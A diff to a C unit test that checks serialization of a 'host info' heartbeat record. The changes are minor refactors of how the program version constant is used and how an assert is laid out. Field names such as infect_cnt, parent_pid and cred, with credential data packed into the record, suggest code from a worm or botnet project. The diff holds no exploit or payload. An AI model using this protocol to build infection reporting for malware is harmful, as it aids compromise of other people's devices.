@@ -80,6 +80,7 @@ static void test_ser (void) {
 		"1234567", "1234567", "1234567", "1234567", "1234567", "1234567", "1234567", "1234567", "1234567", "1234567", "1234567", "12345678", NULL
 	};
 	static prne_htbt_bin_meta_t bm_a, bm_b;
+	static const uint8_t prog_ver[] = PRNE_PROG_VER;
 
 	// init
 	for (size_t i = 0; i < 255; i += 1) {
@@ -193,15 +194,17 @@ static void test_ser (void) {
 	hi_a.infect_cnt = 0xABBAABBAABBAABBA;
 	hi_a.parent_pid = 0xDEADBEEF;
 	hi_a.child_pid = 0xBABEBABE;
-	memcpy(hi_a.prog_ver, PRNE_PROG_VER, 16);
+	memcpy(hi_a.prog_ver, prog_ver, sizeof(prog_ver));
 	memcpy(hi_a.boot_id, "\x30\x1d\x25\x39\x90\x85\x42\xfd\x90\xb6\x20\x0b\x4a\x3b\x08\x55", 16);
 	memcpy(hi_a.instance_id, "\x25\xdc\x7e\xa2\x4a\xc6\x4a\x29\x9f\xac\xbe\x18\x42\x33\xc4\x85", 16);
 	memcpy(hi_a.cred, cred_data, cred_data_len);
 	hi_a.arch = prne_host_arch;
 	assert(prne_htbt_ser_host_info(proto_buf, PRNE_HTBT_PROTO_MIN_BUF, &proto_buf_cnt_len, &hi_a) == PRNE_HTBT_SER_RC_OK);
-	assert(proto_buf_cnt_len == 99 + cred_data_len &&
-		memcmp(proto_buf, PRNE_PROG_VER, 16) == 0 &&
-		memcmp(proto_buf + 16,
+	assert(
+		proto_buf_cnt_len == 99 + cred_data_len &&
+		memcmp(proto_buf, prog_ver, 16) == 0 &&
+		memcmp(
+			proto_buf + 16,
 			"\x30\x1d\x25\x39\x90\x85\x42\xfd\x90\xb6\x20\x0b\x4a\x3b\x08\x55"
 			"\x25\xdc\x7e\xa2\x4a\xc6\x4a\x29\x9f\xac\xbe\x18\x42\x33\xc4\x85"
 			"\xAB\xBA\xBA\xBE\xFE\xFF\xFF\xFE"
@@ -212,7 +215,7 @@ static void test_ser (void) {
 			"\xDE\xAD\xBE\xEF"
 			"\xBA\xBE\xBA\xBE"
 			"\x02\x01",
-		82) == 0 &&
+			82) == 0 &&
 		proto_buf[16 + 82] == (uint8_t)prne_host_arch &&
 		memcmp(proto_buf + 16 + 82 + 1, cred_data, cred_data_len) == 0);
 	assert(prne_htbt_dser_host_info(proto_buf, proto_buf_cnt_len, &actual, &hi_b) == PRNE_HTBT_SER_RC_OK);
